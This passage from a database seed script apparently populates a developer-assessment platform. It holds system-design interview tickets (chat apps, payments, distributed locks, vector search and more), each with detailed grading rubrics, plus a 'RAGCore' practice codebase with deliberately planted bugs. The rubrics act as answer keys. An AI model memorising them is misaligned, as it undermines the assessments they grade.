      filesInvolved: ["fan-out-strategy", "push-providers", "delivery-guarantees", "device-registry"],
      rubric: {
        diagnosis: "Did they correctly identify the fan-out problem as the hardest challenge at scale? Did they distinguish between the latency requirement (5 seconds) and the throughput burst (10k/sec) and identify them as different design drivers?",
        design: "Did they design an async pipeline (API → queue → workers → APNs/FCM) rather than synchronous sending? Did they handle fan-out with a job queue or scatter approach? Did they design the device registry and the provider abstraction layer?",
        communication: "Did they explain how at-least-once delivery is achieved (persistent queue + acknowledgement)? Did they discuss failure handling (dead letter queue, token cleanup)?",
        execution: "Did they cover all 5 required components? Is the delivery status tracking described? Is the offline device handling concrete (e.g. store-and-forward via APNs silent push)?",
      },
      expectedMinutes: 45,
    },
    {
      id: "ticket-sd-04-seed-id-004",
      title: "SD-04: Design a Real-Time Chat Application",
      description: `Design a real-time messaging application similar to WhatsApp or Slack (1-to-1 and group chats).

**Scale requirements:**
- 500 million registered users, 100 million daily active users
- 50 billion messages sent per day (~580,000/sec peak)
- Messages must be delivered in under 100ms when both users are online
- Message history must be stored permanently and searchable
- Group chats support up to 500 members

**Your answer must cover:**
1. How do you establish and maintain persistent connections for real-time delivery — WebSockets, long polling, or something else?
2. What is your message storage model — how do you store messages, and what are the access patterns (latest messages, pagination, search)?
3. How does a message travel from sender to recipient — describe the complete flow including what happens if the recipient is offline
4. How do you handle fan-out in a 500-member group chat at 580k messages/sec?
5. How do you handle connection state — how does the system know which server a user is currently connected to?

Write your complete design below. Address each component with sufficient depth.`,
      difficulty: Difficulty.MID,
      filesInvolved: ["connection-management", "message-storage", "fan-out", "presence-service"],
      rubric: {
        diagnosis: "Did they identify the core challenges: real-time delivery requires persistent connections, offline delivery requires a push/inbox model, and group fan-out at scale requires async processing? Did they distinguish online vs offline delivery paths?",
        design: "Did they design a WebSocket-based connection layer with a connection registry (Redis/consistent hash)? Did they choose an appropriate message store (Cassandra, ScyllaDB, or similar append-optimised)? Did they handle group fan-out via a queue or fan-out service?",
        communication: "Did they explain the complete message delivery flow end-to-end? Did they discuss trade-offs in their storage model (e.g. wide-column vs document store)? Did they address the connection routing problem explicitly?",
        execution: "Did they cover all 5 required components? Is the offline delivery path described? Is the connection state management concrete (which data store, what TTL)?",
      },
      expectedMinutes: 60,
    },
    {
      id: "ticket-sd-05-seed-id-005",
      title: "SD-05: Design a Distributed Job Queue",
      description: `Design a distributed background job processing system (similar to Sidekiq, Celery, or BullMQ at scale).

**Requirements:**
- Producers enqueue jobs; workers pull and execute them
- At-least-once execution guarantee — a job must not be silently lost
- 10,000 job enqueues per second, 5,000 job executions per second
- Jobs can have priorities: HIGH, NORMAL, LOW
- If a worker crashes mid-execution, the job must be retried
- Maximum job execution time: 30 minutes

**Your answer must cover:**
1. Core data model — what does a job look like, how is it stored, how do workers claim jobs?
2. How you prevent two workers from executing the same job simultaneously (no double-execution)
3. How you detect and recover crashed workers (their in-progress jobs must be retried)
4. How you implement job priorities without starvation of low-priority work
5. How you scale — what happens when job throughput doubles to 20,000/sec?

Write your complete design below. Be specific about locking mechanisms, visibility timeouts, and the data structures you would use.`,
      difficulty: Difficulty.MID,
      filesInvolved: ["job-claiming", "visibility-timeout", "priority-queues", "worker-scaling"],
      rubric: {
        diagnosis: "Did they identify the critical challenge — preventing double-execution while guaranteeing at-least-once delivery — as fundamentally requiring a locking or visibility-timeout mechanism? Did they understand that 'at-least-once' and 'exactly-once' are different guarantees with different costs?",
        design: "Did they design a job-claiming mechanism (visibility timeout, pessimistic lock, or leader election)? Did they handle worker crash detection (heartbeat + timeout)? Did they implement priority without starvation (e.g. weighted round-robin, aging)?",
        communication: "Did they explain why their design achieves at-least-once but not exactly-once? Did they discuss the trade-off between polling delay and throughput? Did they explain their scaling approach (more workers, partitioned queues)?",
        execution: "Did they cover all 5 required components? Is the crash recovery mechanism concrete? Is the priority implementation described beyond 'use multiple queues'?",
      },
      expectedMinutes: 45,
    },
    {
      id: "ticket-sd-06-seed-id-006",
      title: "SD-06: Design Twitter's Timeline Feed",
      description: `Design the Twitter home timeline — the feed of tweets from accounts a user follows, sorted reverse-chronologically.

**Scale requirements:**
- 300 million monthly active users, 100 million daily active users
- 500 million tweets created per day
- Users can follow up to 5,000 accounts; celebrities can have 100 million followers
- Timeline reads must respond in under 200ms at p99
- Users expect to see new tweets within 5 seconds of them being posted

**Your answer must cover:**
1. Push model vs pull model vs hybrid — explain the trade-offs and which you choose for this scale
2. What happens when a tweet is posted by a user with 50 million followers — walk through the complete fan-out flow
3. How you store pre-computed timelines — what is the data model and the storage system?
4. How you handle celebrities (high-follower accounts) — do you treat them differently?
5. How a user's timeline is assembled and served in under 200ms

Write your complete design below. This is a SENIOR-level design problem — explain the non-obvious trade-offs.`,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["fan-out-on-write", "fan-out-on-read", "celebrity-problem", "timeline-assembly"],
      rubric: {
        diagnosis: "Did they correctly identify the celebrity/hotspot problem as the core challenge — pure push fan-out is infeasible for accounts with 100M followers? Did they identify that pure pull is too slow at read time for 200ms p99? Did they arrive at a hybrid model?",
        design: "Did they design a hybrid approach: push for regular users, pull-on-read for celebrities, merge at serve time? Did they describe the timeline storage model (Redis sorted set or equivalent) and the tweet store? Did they explain how the 200ms SLA is met?",
        communication: "Did they clearly articulate the push vs pull trade-off? Did they explain the celebrity threshold logic? Did they describe the 5-second delivery requirement and how it interacts with fan-out latency?",
        execution: "Did they cover all 5 required components? Is the fan-out flow for a 50M-follower celebrity walk-through concrete? Is the timeline assembly step (merge pre-computed list + celebrity tweets) clearly described?",
      },
      expectedMinutes: 60,
    },
    {
      id: "ticket-sd-07-seed-id-007",
      title: "SD-07: Design a Payment Processing System",
      description: `Design a payment processing system that handles credit card charges for an e-commerce platform.

**Scale requirements:**
- 10,000 payment transactions per second at peak (Black Friday scale)
- Exactly-once processing — a customer must never be charged twice for the same order
- Payments must complete or definitively fail within 30 seconds
- Full audit trail required for every payment attempt, including failures
- Must integrate with external payment providers (Stripe, Adyen) that have their own rate limits and failure modes

**Your answer must cover:**
1. How you guarantee exactly-once charging — idempotency keys, deduplication strategy
2. How you handle the case where the provider charges the card but your database write fails (phantom charge)
3. How you model the payment state machine — what are the states and valid transitions?
4. How you build the audit trail — what events do you record and where?
5. How you handle provider rate limits and failures — circuit breakers, fallback providers

Write your complete design below. Payment systems are high-stakes — be specific about every failure mode.`,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["idempotency", "payment-state-machine", "audit-trail", "provider-integration"],
      rubric: {
        diagnosis: "Did they identify the phantom charge scenario (provider succeeds, DB write fails) as the hardest failure case? Did they understand that exactly-once processing requires idempotency keys at the provider level, not just deduplication in your DB?",
        design: "Did they design idempotency keys derived from (orderId + customerId + amount) or equivalent? Did they handle the phantom charge with a reconciliation job or idempotent retry? Did they model the payment state machine (PENDING → AUTHORISED → CAPTURED / FAILED / REFUNDED)?",
        communication: "Did they explain why exactly-once is hard in distributed systems (network partitions, timeouts)? Did they discuss the circuit breaker pattern for provider failures? Did they explain the audit trail model (append-only event log)?",
        execution: "Did they cover all 5 required components? Is the idempotency mechanism concrete (stored key + status)? Is the state machine drawn or described with valid transitions? Is the audit trail implementation specific (what store, what events)?",
      },
      expectedMinutes: 75,
    },
    {
      id: "ticket-sd-08-seed-id-008",
      title: "SD-08: Design Netflix Video Streaming",
      description: `Design the core video streaming infrastructure for a Netflix-scale service.

**Scale requirements:**
- 200 million subscribers, 100 million concurrent streams at peak
- Videos range from 1GB (SD) to 60GB (4K HDR) per title
- Startup latency: first frame must appear within 2 seconds on a fast connection
- 99.99% availability — users cannot see buffering or errors during playback
- Content library: 15,000 titles, each encoded in 20+ quality/resolution variants

**Your answer must cover:**
1. Video storage and encoding pipeline — how does a new title go from raw video to available for streaming?
2. How you serve video content at 100 million concurrent streams — CDN strategy, edge caching
3. How adaptive bitrate streaming works — how does the player pick quality, and what does the server need to provide?
4. How you handle the long-tail cold start problem — a niche title requested for the first time hits a cold CDN edge node
5. How you design for 99.99% availability — what are the failure modes and how do you handle them?

Write your complete design below. Focus on the streaming delivery pipeline and the CDN architecture.`,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["encoding-pipeline", "cdn-architecture", "adaptive-bitrate", "availability"],
      rubric: {
        diagnosis: "Did they correctly identify that serving 100M concurrent streams is fundamentally a CDN/edge problem, not an origin server problem? Did they identify adaptive bitrate streaming (DASH/HLS) as the mechanism for quality adaptation? Did they scope the cold-start problem correctly?",
        design: "Did they design a multi-tier CDN (origin → regional → edge) with aggressive caching? Did they describe chunked encoding and manifest files (MPD/M3U8) for ABR? Did they describe the encoding pipeline (raw → transcoding → multiple renditions → CDN upload)?",
        communication: "Did they explain how ABR works at a protocol level — manifest file, segment requests, quality selection algorithm? Did they discuss the cold-start mitigation strategy (pre-warming, tiered fallback)? Did they explain the 99.99% availability design?",
        execution: "Did they cover all 5 required components? Is the CDN tier architecture described with at least two levels? Is the ABR segment size and manifest structure mentioned? Is the encoding pipeline described from ingest to playback-ready?",
      },
      expectedMinutes: 75,
    },
    {
      id: "ticket-sd-09-seed-id-009",
      title: "SD-09: Design Google Search Autocomplete",
      description: `Design the search query autocomplete/typeahead feature you see on Google Search.

**Requirements:**
- Show top 10 suggestions within 100ms of each keystroke
- Suggestions must reflect trending queries — update frequency counts in near-real-time
- Handle 10 billion search queries per day across 2 billion users (~115,000 queries/sec)
- Support 100+ languages and locale-specific suggestions
- No suggestion should be offensive or harmful

**Your answer must cover:**
1. Data model — how do you store query strings and their frequencies to support prefix lookups?
2. How you serve suggestions in under 100ms — what data structure and where does it live?
3. How you update suggestion frequencies in near-real-time without blocking reads
4. How you handle personalisation — logged-in users see their own recent queries first
5. How you filter offensive/harmful suggestions from the results

Write your complete design below. This is a read-heavy system with a hard latency requirement — focus on the serving layer.`,
      difficulty: Difficulty.MID,
      filesInvolved: ["trie-structure", "frequency-counting", "serving-layer", "personalisation"],
      rubric: {
        diagnosis: "Did they identify the trie (prefix tree) or sorted prefix index as the appropriate data structure for prefix lookups? Did they understand that 100ms requires the index to live in memory (not disk), and that 10B queries/day means frequency updates must be async, not synchronous?",
        design: "Did they design an in-memory trie or equivalent (Redis ZRANGEBYLEX, Elasticsearch prefix) for serving? Did they design async frequency update pipeline (Kafka/queue → batch aggregation → trie rebuild)? Did they address personalisation with a user query history overlay?",
        communication: "Did they explain the trie vs other data structures (inverted index, sorted set) and why trie is suitable? Did they explain the async update pipeline and the trade-off (near-real-time vs real-time)?",
        execution: "Did they cover all 5 required components? Is the trie structure or equivalent described concretely? Is the frequency update pipeline end-to-end? Is the offensive content filtering strategy mentioned (blocklist, ML filter)?",
      },
      expectedMinutes: 45,
    },
    {
      id: "ticket-sd-10-seed-id-010",
      title: "SD-10: Design a Distributed Cache",
      description: `Design a distributed in-memory cache system (similar to Redis Cluster or Memcached) that can be used as a shared cache layer across a fleet of application servers.

**Requirements:**
- Store up to 1TB of cached data across the cluster
- Serve 1 million cache reads per second with sub-millisecond p99 latency
- Cache nodes can be added or removed without full cache invalidation (minimal key redistribution)
- When a cache node fails, the system should continue serving — no single point of failure
- Support TTL-based expiry and LRU eviction when memory is full

**Your answer must cover:**
1. How you partition data across cache nodes — consistent hashing, why this matters for node addition/removal
2. How you handle a cache node failure — what happens to the keys that were on the failed node?
3. How you implement replication — where do replica reads go, and how do you handle replica lag?
4. How you implement LRU eviction — approximate LRU at scale
5. How you handle hot keys — when one key receives 100,000 requests per second

Write your complete design below. This is an infrastructure-level design — be specific about data distribution and failure handling.`,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["consistent-hashing", "replication", "lru-eviction", "hot-key-mitigation"],
      rubric: {
        diagnosis: "Did they correctly identify consistent hashing (with virtual nodes) as the solution to minimal redistribution on node add/remove? Did they identify hot keys as a separate problem from node failure? Did they understand that sub-millisecond p99 requires data to be in local memory, not fetched from a remote replica?",
        design: "Did they design consistent hashing with virtual nodes for data partitioning? Did they design replication (primary + N replicas per shard, with read replicas)? Did they describe approximate LRU (sampling or segmented LRU) for eviction? Did they address hot keys (local micro-caching, key sharding by request)?",
        communication: "Did they explain why consistent hashing minimises redistribution compared to simple modulo partitioning? Did they discuss the CAP theorem implications of their replication design (CP vs AP under network partition)? Did they explain hot key mitigation concretely?",
        execution: "Did they cover all 5 required components? Is the consistent hashing ring described with virtual nodes? Is the replica failure path (promotion, rebalance) described? Is the hot key strategy concrete beyond 'replicate the key'?",
      },
      expectedMinutes: 60,
    },
    {
      id: "ticket-sd-11-seed-id-011",
      title: "SD-11: Design a Ticket Booking System (Ticketmaster)",
      description: `Design the seat-booking system for a high-demand event ticketing platform.

**Scale requirements:**
- A popular concert: 60,000 seats, 2 million people trying to buy in the first 60 seconds
- A seat must NEVER be sold to two different people
- A user who selects a seat should get a short hold (e.g. 10 minutes) to complete payment
- If they don't pay in time, the seat is released back to the pool automatically
- Reads (seat-map availability) vastly outnumber writes

**Your answer must cover:**
1. How you guarantee a seat is never double-sold under 2M concurrent buyers — the locking/reservation mechanism
2. The seat-hold lifecycle: select → hold (TTL) → pay → confirm, or hold expiry → release
3. How you serve the live seat map to 2M users without hammering the source of truth
4. What happens when the payment succeeds but the confirmation write fails (don't lose the seat or the money)
5. How you prevent a stampede from collapsing the system in the first 60 seconds (queueing, waiting room)

This is a correctness-under-concurrency problem — be explicit about every race condition.`,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["seat-locking", "hold-lifecycle", "availability-cache", "stampede-control"],
      rubric: {
        diagnosis: "Did they identify that the core problem is correctness under extreme concurrency, not raw throughput — a seat is a unique, limited resource and the check-then-reserve is a race? Did they recognize the hold-expiry and the payment-vs-confirmation failure as the subtle hard cases?",
        design: "Did they design an atomic reserve (conditional update / row lock / Redis atomic op) so a seat can be held by exactly one user? Did they implement the hold with a TTL and an automatic release (expiry sweep or TTL key)? Did they front the live seat-map with a cache and handle the stampede with a waiting room/queue?",
        communication: "Did they reason about strong consistency on the seat write vs eventual consistency on the seat-map view, and justify it? Did they explain the reconciliation for the payment-success/confirmation-failure case?",
        execution: "Did they cover all 5 points? Is the atomic reservation concrete (what store, what operation)? Is the hold-expiry mechanism specified? Is the stampede control more than 'add more servers'?",
      },
      expectedMinutes: 60,
    },
    {
      id: "ticket-sd-12-seed-id-012",
      title: "SD-12: Design a Ride-Matching / Dispatch System (Uber)",
      description: `Design the system that matches riders to nearby drivers in real time.

**Scale requirements:**
- 5 million active drivers globally, each sending a location update every 4 seconds (~1.25M updates/sec)
- 1 million ride requests per minute at peak
- A rider must be matched to a nearby driver within 5 seconds
- Matching should prefer the closest available driver but avoid assigning the same driver to two riders

**Your answer must cover:**
1. How you store and index 5M continuously-moving driver locations to answer "drivers near (lat,lng)" fast — the spatial index
2. How a ride request finds candidate drivers and selects one without double-assigning a driver to two riders
3. How you ingest 1.25M location updates/sec without overwhelming the datastore
4. How you handle the matching race: two riders request at the same time and both get matched to the same nearby driver
5. How you keep the matching latency under 5 seconds at peak

Be specific about the spatial data structure and the concurrency control on driver assignment.`,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["spatial-index", "matching-engine", "location-ingestion", "assignment-concurrency"],
      rubric: {
        diagnosis: "Did they identify the two distinct hard problems — (a) efficient geospatial proximity queries over constantly-moving points, and (b) preventing double-assignment of a driver under concurrent matches? Did they note that 1.25M writes/sec rules out naive per-update DB writes?",
        design: "Did they choose an appropriate spatial index (geohash buckets, quadtree, S2, or Redis GEO) and justify it for moving points? Did they make driver assignment atomic (lock/conditional update/state machine) so a driver can't be matched twice? Did they handle the high-write location stream (in-memory grid, sharded by region)?",
        communication: "Did they explain the geohash/quadtree trade-off and why simple lat/lng indexing fails? Did they reason about regional sharding and the consistency of driver state?",
        execution: "Did they cover all 5 points? Is the spatial index concrete? Is the anti-double-assignment mechanism specified? Is the location-ingestion path scalable (not one DB write per update)?",
      },
      expectedMinutes: 60,
    },
    {
      id: "ticket-sd-13-seed-id-013",
      title: "SD-13: Design an Ad-Click Aggregation Pipeline",
      description: `Design a system that ingests ad-click events and produces accurate, near-real-time click counts per ad (used for billing advertisers).

**Scale requirements:**
- 1 million click events per second at peak
- Counts are used for BILLING — they must be accurate (no over/under counting), and duplicate events must be counted once
- Advertisers see updated counts within 1 minute (near-real-time dashboard)
- Also support accurate historical queries: "clicks for ad X between any two timestamps"
- Clients may retry and send the same click event more than once

**Your answer must cover:**
1. How you achieve exactly-once counting despite duplicate/retried events — the deduplication strategy
2. The ingestion + aggregation pipeline — how raw events become per-ad, per-minute counts
3. How you reconcile the tension between fast (near-real-time) and accurate (billing-grade) counts — lambda/kappa or similar
4. How you store aggregates to answer arbitrary time-range queries efficiently
5. What happens when an aggregation worker crashes mid-batch — no double counting, no lost counts

Counting at scale for billing is deceptively hard — focus on correctness.`,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["deduplication", "stream-aggregation", "lambda-architecture", "exactly-once"],
      rubric: {
        diagnosis: "Did they identify that exactly-once counting under retries is the crux, and that 'fast' and 'billing-accurate' pull in opposite directions (the classic reason for a speed layer + batch layer)? Did they recognize at-least-once delivery + idempotent processing as the practical path to exactly-once?",
        design: "Did they design dedup via event ids (idempotency keys + a dedup store, or windowed dedup in the stream)? Did they design a streaming aggregation (Kafka → Flink/Spark Streaming → time-bucketed counts) plus a batch reconciliation layer for accuracy? Did they store aggregates in a time-series/OLAP-friendly store for range queries?",
        communication: "Did they explain why exactly-once is achieved via at-least-once + idempotency rather than 'true' exactly-once? Did they articulate the lambda/kappa trade-off (latency vs accuracy)?",
        execution: "Did they cover all 5 points? Is the dedup mechanism concrete (key + store + window)? Is the crash-recovery (checkpointing/offsets) described so no double or lost counts? Is the storage chosen for range queries?",
      },
      expectedMinutes: 60,
    },
    {
      id: "ticket-sd-14-seed-id-014",
      title: "SD-14: Design a Distributed Lock Service",
      description: `Design a distributed lock service that application servers use to coordinate access to shared resources (similar to what you'd build on top of etcd/Zookeeper/Redis).

**Requirements:**
- Mutual exclusion: at most one client holds a given lock at a time
- 100,000 lock/unlock operations per second
- A client that acquires a lock then crashes must not hold it forever — locks must be reclaimable
- The service itself must be highly available — it cannot be a single point of failure
- Clients are spread across many machines and may experience network delays and GC pauses

**Your answer must cover:**
1. How you guarantee mutual exclusion even when a lock holder pauses (GC) or its network is slow — and why a naive TTL lock is unsafe here
2. How a crashed lock holder's lock is safely reclaimed (lease/TTL) without two clients believing they hold it
3. How you make the lock service itself highly available (replication, consensus, leader)
4. The fencing problem: a paused client wakes up after its lock expired and tries to write — how do you prevent corruption?
5. The consistency vs availability trade-off your design makes under a network partition

This is a coordination/correctness problem — the fencing token discussion is the senior signal.`,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["mutual-exclusion", "lease-expiry", "high-availability", "fencing-tokens"],
      rubric: {
        diagnosis: "Did they identify the deep problem — a TTL lock alone is unsafe because a paused (GC/network) holder can act after expiry while another client holds the lock — and that fencing tokens (monotonic numbers checked at the resource) are required for true safety? Did they recognize the lock service needs consensus to avoid being a SPOF?",
        design: "Did they design leases with TTL for crash reclamation AND fencing tokens to make stale holders' writes rejected at the resource? Did they make the service HA via a consensus-backed store (Raft/Paxos, etcd/Zookeeper) rather than a single node? Did they reason about lock granularity and contention?",
        communication: "Did they explicitly explain why TTL alone is insufficient (the Martin Kleppmann fencing argument), and the CP-under-partition choice? Did they discuss consensus vs a single Redis node trade-offs (Redlock caveats)?",
        execution: "Did they cover all 5 points? Are fencing tokens concretely described (monotonic counter, checked by the resource)? Is the HA mechanism named (Raft/etcd)? Is the partition behavior (CP) stated?",
      },
      expectedMinutes: 60,
    },
    {
      id: "ticket-sd-15-seed-id-015",
      title: "SD-15: Design a Webhook Delivery System",
      description: `Design a service that reliably delivers webhook events to third-party customer endpoints (like Stripe or GitHub delivering events to your server).

**Requirements:**
- 50,000 events per second to deliver across millions of customer endpoints
- At-least-once delivery — an event must not be silently dropped
- Per-endpoint ordering should be preserved where possible
- Customer endpoints are unreliable: they time out, return 500s, or are down for hours
- A slow/broken customer endpoint must NOT delay delivery to healthy endpoints
- Customers can see delivery status and replay failed events

**Your answer must cover:**
1. The delivery pipeline — how an event goes from produced to delivered, with at-least-once guarantee
2. Retry strategy for failing endpoints — backoff, max attempts, and what happens after
3. How you isolate a slow/broken endpoint so it doesn't block delivery to everyone else (noisy-neighbor)
4. How you preserve per-endpoint ordering while still parallelising across endpoints
5. How you expose delivery status and support manual replay

Reliability and isolation are the hard parts — be specific about queue design and retries.`,
      difficulty: Difficulty.MID,
      filesInvolved: ["delivery-pipeline", "retry-backoff", "endpoint-isolation", "ordering"],
      rubric: {
        diagnosis: "Did they identify the two core challenges — reliable at-least-once delivery to unreliable endpoints, and isolating slow endpoints so one bad customer doesn't starve everyone (head-of-line blocking)? Did they note that per-endpoint ordering + parallelism across endpoints requires partitioning by endpoint?",
        design: "Did they design a durable queue + workers with retries (exponential backoff + jitter, max attempts → dead-letter queue)? Did they isolate endpoints (per-endpoint queues/partitions, circuit breaker on a failing endpoint) to prevent noisy-neighbor blocking? Did they preserve order via per-endpoint partitioning?",
        communication: "Did they explain at-least-once via persistent queue + ack, the backoff strategy and why jitter matters, and the ordering-vs-parallelism trade-off? Did they discuss the circuit breaker for dead endpoints?",
        execution: "Did they cover all 5 points? Is the retry policy concrete (backoff, cap, DLQ)? Is endpoint isolation specified (per-endpoint partition/breaker)? Is replay/status described?",
      },
      expectedMinutes: 45,
    },
    {
      id: "ticket-sd-16-seed-id-016",
      title: "SD-16: Design a Collaborative Document Editor (Google Docs)",
      description: `Design the real-time collaboration engine for a multi-user document editor.

**Requirements:**
- Multiple users edit the same document simultaneously and see each other's changes within ~200ms
- Concurrent edits must converge: everyone ends up with the same final document, with no lost characters
- Documents can be large (100k+ characters) and have up to 50 simultaneous editors
- Must work despite users having different network latencies; offline edits should reconcile on reconnect
- Edit history / undo must be supported

**Your answer must cover:**
1. The core conflict-resolution model — Operational Transformation (OT) or CRDTs — and the trade-offs of your choice
2. How two concurrent edits at the same position are resolved so the document converges identically for all users
3. The client-server data flow for real-time propagation (and whether the server is authoritative)
4. How offline edits are reconciled when a user reconnects after making changes
5. How you store the document and its edit history efficiently

Concurrent-edit convergence is the entire problem — your OT/CRDT reasoning is what's scored.`,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["ot-vs-crdt", "convergence", "realtime-sync", "offline-reconciliation"],
      rubric: {
        diagnosis: "Did they identify that the fundamental challenge is concurrent-edit convergence (eventual consistency where all replicas reach the same state regardless of operation order), and that naive last-write-wins loses characters? Did they correctly frame OT vs CRDT as the two real approaches with concrete trade-offs?",
        design: "Did they pick OT or CRDT and justify it (OT: server-authoritative transform, simpler storage, harder correctness; CRDT: peer-friendly, offline-friendly, larger metadata)? Did they describe how a concurrent insert/delete at the same index is transformed/merged to converge? Did they handle offline reconciliation (the chosen model's merge on reconnect)?",
        communication: "Did they clearly explain the convergence guarantee and the OT-vs-CRDT trade-off (correctness complexity vs metadata overhead, central vs decentralized)? Did they address why intention preservation matters?",
        execution: "Did they cover all 5 points? Is the conflict-resolution mechanism described concretely (transform function or CRDT structure)? Is the offline-merge path specified? Is history/storage addressed?",
      },
      expectedMinutes: 75,
    },
    {
      id: "ticket-sd-17-seed-id-017",
      title: "SD-17: Design an A/B Testing / Experimentation Platform",
      description: `Design a platform that lets product teams run controlled experiments (A/B tests) across a large user base.

**Requirements:**
- 100 million users; a user must be consistently assigned to the same variant for a given experiment across sessions and devices
- Support hundreds of concurrent experiments without users leaking between conflicting ones
- Assignment must be fast (<5ms) and happen inline on the request path
- Collect and aggregate metrics per variant in near-real-time to judge significance
- Experiment config changes (start, stop, ramp traffic) must take effect quickly across all servers

**Your answer must cover:**
1. How you deterministically and consistently assign a user to a variant (same user → same bucket) without storing every assignment
2. How you prevent interaction/leakage between overlapping experiments (mutual exclusion of conflicting tests)
3. How assignment runs inline at <5ms across all servers — where config lives and how it's distributed
4. How you collect per-variant metrics and compute statistical significance in near-real-time
5. How config changes (ramping a test from 1% → 50%) propagate quickly and safely

The deterministic-bucketing and leakage-prevention parts are the non-obvious challenges.`,
      difficulty: Difficulty.MID,
      filesInvolved: ["deterministic-bucketing", "experiment-isolation", "config-distribution", "metrics-pipeline"],
      rubric: {
        diagnosis: "Did they identify that consistent assignment without storing 100M×N assignments requires DETERMINISTIC hashing (hash(userId+experimentId) % buckets), and that overlapping experiments can interact/leak unless isolated (layers / mutually-exclusive groups)? Did they note assignment must be local (no network call) to hit <5ms?",
        design: "Did they design deterministic bucketing via hashing (stable across sessions/devices, no stored assignment)? Did they prevent leakage with experiment layers / exclusion groups? Did they distribute config to every server (push/poll, in-memory) for inline <5ms assignment? Did they design a metrics pipeline with significance testing?",
        communication: "Did they explain why hashing beats storing assignments (scale, consistency), and how layering prevents cross-experiment interference? Did they discuss the config-propagation trade-off (staleness vs load)?",
        execution: "Did they cover all 5 points? Is the bucketing function concrete and stable? Is leakage prevention specified (layers/exclusion)? Is config distribution + the metrics/significance path described?",
      },
      expectedMinutes: 45,
    },
    {
      id: "ticket-sd-18-seed-id-018",
      title: "SD-18: Design a Vector / Semantic Search System",
      description: `Design a semantic search system that, given a text query, returns the most similar documents by meaning (the retrieval layer behind a RAG or recommendation product).

**Scale requirements:**
- 500 million documents, each represented as a 768-dimension embedding vector
- 10,000 search queries per second
- A query must return the top-20 most similar vectors within 50ms at p99
- New documents are added continuously and must become searchable within minutes
- Recall matters: missing relevant results is costly, but exact nearest-neighbor over 500M vectors is too slow

**Your answer must cover:**
1. Why exact nearest-neighbor search is infeasible at this scale and what you use instead (approximate NN) — name the index (HNSW, IVF, etc.) and the recall-vs-latency trade-off
2. How you partition/shard 500M vectors across nodes and aggregate top-k results from shards
3. How you keep the index fresh as new documents arrive (incremental indexing vs rebuilds)
4. How you serve top-20 in <50ms at 10k QPS — where the index lives, memory footprint
5. How you balance recall (finding the truly nearest) against latency and cost

The ANN index choice and the recall/latency trade-off are the core of the answer.`,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["ann-index", "sharding-topk", "incremental-indexing", "recall-latency-tradeoff"],
      rubric: {
        diagnosis: "Did they identify that exact k-NN over 500M×768-dim vectors is computationally infeasible at 50ms/10k QPS, so Approximate Nearest Neighbor (ANN) is required, trading a controllable amount of recall for huge latency gains? Did they recognize freshness (incremental indexing) as a real tension with ANN structures?",
        design: "Did they choose an ANN index (HNSW for recall/latency, or IVF-PQ for memory) and justify it? Did they shard vectors across nodes and do scatter-gather top-k with re-ranking? Did they handle incremental inserts (HNSW supports it) vs periodic rebuilds? Did they reason about the in-memory footprint (500M×768×4 bytes ≈ 1.5TB → must shard/quantize)?",
        communication: "Did they explain the recall-vs-latency knob (efSearch/nprobe) and the index trade-offs (HNSW memory vs IVF-PQ compression)? Did they quantify the memory and justify sharding/quantization?",
        execution: "Did they cover all 5 points? Is the ANN index named and justified? Is the scatter-gather top-k across shards described? Is incremental freshness addressed? Did they do the back-of-envelope memory math?",
      },
      expectedMinutes: 60,
    },
  ];

  for (const t of sdTickets) {
    await prisma.ticket.upsert({
      where: { id: t.id },
      update: {},
      create: { ...t, stack: Stack.SYSTEM_DESIGN, codebaseId: sdCodebase.id },
    });
  }

  // ── RAGCore codebase ──────────────────────────────────────────────────────
  const ragCodebase = await prisma.codebase.upsert({
    where: { id: "ragcore-seed-id-001" },
    update: {},
    create: {
      id: "ragcore-seed-id-001",
      name: "RAGCore",
      stack: Stack.PYTHON,
      repoUrl: "https://github.com/DevSimulate/ragcore",
      description: "A production-grade Retrieval-Augmented Generation (RAG) API built with FastAPI, LangChain, ChromaDB, and PostgreSQL. Multi-tenant document ingestion, semantic search, and conversational Q&A.",
      companyLore: `RAGCore is a B2B SaaS product that allows enterprise customers to upload their internal documents and query them using natural language through an OpenAI-powered RAG pipeline.

The engineering team is 6 developers. The codebase was originally built as a proof-of-concept and promoted to production faster than expected. Several critical bugs were introduced during the rapid development phase and have not been caught in code review.

Key architectural decisions engineers must understand:
- Multi-tenancy is enforced via ChromaDB collection-per-tenant: tenant_id must be validated before any vector operation
- Embeddings are cached in Redis. Cache key must include the model name — swapping models while cache is warm returns wrong-dimension vectors
- LangChain is used via the split package pattern: langchain-core, langchain-community, langchain-openai (NOT the deprecated monolithic langchain package)
- Session memory for conversational chains is stored in a class-level dict — this is intentional for now but has a known unbounded growth issue
- Document ingestion is async: documents move through states (processing → ready → error)
- The relevance threshold constant (0.72) exists in vector_store.py but the filter is commented out — users are seeing irrelevant results

Known production issues currently affecting customers:
- Customers uploading the same document twice get duplicate search results
- Chat history occasionally gets corrupted under concurrent requests in the same session
- The delete document endpoint leaves orphaned vector embeddings in ChromaDB
- Large file uploads are timing out the API server
- PDF documents with scanned pages silently drop those pages without warning`,
    },
  });

  const ragTickets = [
    {
      id: "ticket-rag-01-seed-id-001",
      title: "RAG-01: Chat Completions Crash with 400 on Long Conversations",
      description: `Users report that long chat sessions intermittently crash with no useful error message. Support has captured the API error: the OpenAI API returns HTTP 400 with "This model's maximum context length is 128,000 tokens." The error is never surfaced to the user — the UI shows a generic "Something went wrong."

**What's happening:**
The \`chat_complete()\` function in \`app/services/llm_service.py\` sends messages directly to OpenAI without checking the total token count first. After a long conversation the accumulated messages exceed the model's context window and the API call fails.

**Your task:**
1. Find the token counting function in \`llm_service.py\` — it exists but is never called from \`chat_complete()\`
2. Add a token budget check before the API call that raises a clear \`ValueError\` if messages exceed the limit
3. The model limit is 128,000 tokens. Reserve 2,000 tokens for the response (max_tokens). The check should fail if messages_tokens + 2000 > 128000
4. Make sure the test in \`tests/test_llm_service.py::TestTokenGuard::test_raises_when_messages_exceed_context\` passes

**Files:** \`app/services/llm_service.py\``,
      difficulty: Difficulty.JUNIOR,
